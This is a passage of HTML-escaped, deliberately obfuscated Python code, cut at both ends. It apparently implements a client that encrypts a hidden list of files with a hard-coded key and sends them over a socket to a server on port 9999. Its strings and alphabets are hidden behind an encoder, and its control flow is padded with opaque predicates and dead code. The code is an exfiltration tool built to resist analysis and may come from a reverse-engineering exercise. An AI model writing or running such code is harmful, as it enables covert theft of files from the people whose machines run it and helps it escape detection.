._v = 751 def _m(self): return self._v * 5#!/usr/bin/env python3import socketimport jsonimport osimport sysimport hashlibimport timesys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))import crypt_coreclass CustomBase64: CUSTOM_ALPHABET = _oe(&quot;8&lt;&lt;BLok1UrR&#125;_R&gt;27yTmms1djUI&amp;&#123;(7Ls&#123;Apm;c@eJQYZA-rTHu4po&#125;aw559KBaUw?kHpDBVghrW#KRr&quot;, 83, 214, 17) STANDARD_ALPHABET = ( _oe(&quot;0fj&#123;dfJO_COA?e)7n4^Mo&gt;&amp;&gt;3T^^WT1BYWEqGTnZX)3I6F|~Czuy#AYdpNp$J-J~b;VEk7AYtVtX5cz&#125;&quot;, 83, 214, 17) ) ENCODE_TABLE = str.maketrans(STANDARD_ALPHABET, CUSTOM_ALPHABET) DECODE_TABLE = str.maketrans(CUSTOM_ALPHABET, STANDARD_ALPHABET) @classmethod def decode(cls, data: str) -&gt; bytes: import base64 std_b64 = data.translate(cls.DECODE_TABLE) return base64.b64decode(std_b64)SERVER_HOST = &quot;&quot;SERVER_PORT = 9999KEY_B64 = _oe(&quot;C7MAupdc5tRBM!52kv4Wmp~Hle`A4N5`t?5nObY+L~6Pz5wdF*y=E$zQv!xZ&quot;, 83, 214, 17)KEY = CustomBase64.decode(KEY_B64)FILES_TO_SEND = [_oe(&quot;I-p&#125;FvS)q0emD&quot;, 83, 214, 17), _oe(&quot;B(-BJ_&lt;B6O&quot;, 83, 214, 17), _oe(&quot;C$MxRtZ99&#123;emD&quot;, 83, 214, 17)]def _opaque_true(): _x = 0 for _i in range(100): _x += _i * (_i - _i + 1) return _x &gt;= 0def _opaque_false(): _a, _b = 5, 7 return (_a * _b) == (_b * _a + 1)def _dead_calc(): _dead = 0 for _i in range(50): _dead = (_dead + _i) % 17 if _dead &gt; 100: _dead = _dead * 2 + 1 return _deaddef encrypt_file(key: bytes, plaintext: bytes) -&gt; bytes: _state = 0 _result = None while _state &lt; 3: if _state == 0: if _opaque_true(): _result = crypt_core.encode_data(plaintext, key[:16]) _state = 2 else: _dead_calc() _state = 1 elif _state == 1: _dead_calc() _state = 2 elif _state == 2: if _opaque_false(): _result = None _state = 3 return _resultdef send_single_file(sock, filename, plaintext): _s = 0 _ct = None _pl = None while _s &lt; 5: if _s == 0: _ct = encrypt_file(KEY, plaintext) _s = 1 elif _s == 1: _pl = &#123;_oe(&